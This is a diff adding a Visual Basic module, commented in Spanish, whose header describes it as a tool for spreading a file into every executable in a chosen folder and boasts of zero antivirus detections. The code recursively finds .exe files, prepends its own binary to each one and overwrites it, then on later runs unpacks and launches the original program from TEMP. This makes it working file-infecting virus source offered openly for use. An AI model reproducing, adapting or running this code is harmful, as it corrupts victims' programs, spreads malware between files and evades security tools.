@@ -1,0 +1,105 @@
+'---------------------------------------------------------------------------------------
+' Modulo     : mSpreadEXE
+' Autor      : chequinho
+' Fecha      : 01/07/2013
+' Finalidad  : Distribuir o "spradear" un archivo en todos los archivos .exe ubicados en el directorio indicado
+' Uso        : Call SpreadEXE(App.Path & "\" & App.EXEName & ".exe", Environ$("USERPROFILE"))
+' Detecciones: 0/35 (P-Code)
+' Notas
+'   - Es altamente recomendado que se deje como ruta de spradeo la carpeta del usuario, ya que el infectar los exe del sistema puede provocar daños irreversibles
+'   - El exe final contendrá el icono del exe a spradear, lo cual delata un poco, pero eso se los dejo a ustedes
+'---------------------------------------------------------------------------------------
+ 
+Public Sub SpreadEXE(sFilePath As String, sRuta As String)
+    Dim Finded As String
+    Dim sFiles() As String
+    Dim j As Long
+    Dim contador As Long
+    Dim targetData As String
+    Dim sourceData As String
+    Dim finalData As String
+    sourceData = ReadFile(sFilePath)
+    Finded = FindFilesByExtension(sRuta, ".exe", True)
+    sFiles = Split(Finded, ",")
+    contador = 0
+     
+    'Comprobamos si hay algun ejecutable infectado en la ruta
+    For j = 0 To UBound(sFiles)
+        If sFiles(j) <> vbNullString Then If sFilePath = sFiles(j) Then contador = contador + 1
+    Next j
+     
+    'Si no hay ninguno infectado, entonces los infecta
+    If contador = 0 Then
+        For j = 0 To UBound(sFiles)
+            If sFiles(j) <> vbNullString Then
+                If GetAttr(sFiles(j)) And vbNormal Then
+                    targetData = ReadFile(sFiles(j))
+                    finalData = sourceData & "<SEP>" & targetData
+                    Call WriteFile(sFiles(j), finalData)
+                End If
+            End If
+        Next j
+         
+    'Si ya hay infectados, entonces ejecuta los datos correspondientes al archivo original
+    Else
+        Dim originalData As String
+        originalData = Split(ReadFile(sFilePath), "<SEP>")(1)
+        Call WriteFile(Environ$("TEMP") & "\" & Mid$(sFilePath, InStrRev(sFilePath, "\") + 1), originalData)
+        Call Shell(Environ$("TEMP") & "\" & Mid$(sFilePath, InStrRev(sFilePath, "\") + 1), vbNormalFocus)
+    End If
+End Sub
+ 
+Function FindFilesByExtension(ByVal sPath As String, sExtensions As String, bRecursive As Boolean) As String
+    On Error Resume Next
+    Dim subPath() As String
+    Dim nDir As Integer
+    Dim aExtensions() As String
+    Dim i As Integer
+    Dim j As Integer
+    Dim sFiles As String
+    Dim currentFile As String
+    If Right$(sPath, 1) <> "\" Then sPath = sPath & "\"
+    currentFile = Dir$(sPath & "*.*", vbDirectory)
+    While Len(currentFile)
+        If (currentFile <> "..") And (currentFile <> ".") Then
+            If GetAttr(sPath & currentFile) And vbDirectory Then
+                ReDim Preserve subPath(nDir)
+                subPath(nDir) = currentFile
+                nDir = nDir + 1
+            Else
+                aExtensions = Split(sExtensions, ",")
+                For j = 0 To UBound(aExtensions)
+                    If "." & Mid$(Mid$(currentFile, InStrRev(currentFile, "\") + 1), InStrRev(Mid$(currentFile, InStrRev(currentFile, "\") + 1), ".") + 1) = aExtensions(j) Then
+                        sFiles = sFiles & "," & sPath & currentFile
+                    End If
+                Next j
+            End If
+        End If
+        currentFile = Dir$
+    Wend
+    If bRecursive = True Then
+        For i = 0 To nDir - 1
+            sFiles = sFiles & "," & FindFilesByExtension(sPath & subPath(i) & "\", sExtensions, bRecursive)
+        Next i
+    End If
+    FindFilesByExtension = Mid$(sFiles, 2)
+    Erase subPath
+End Function
+ 
+Function ReadFile(sPath As String) As String
+    Open sPath For Binary As #1
+        ReadFile = Space$(LOF(1))
+        Get #1, , ReadFile
+    Close #1
+End Function
+ 
+Function WriteFile(sPath As String, sData As String) As Boolean
+    On Error GoTo error_handler
+    Open sPath For Binary As #1
+        Put #1, , sData
+    Close #1
+    WriteFile = True
+    Exit Function
+error_handler:
+    WriteFile = False
+End Function
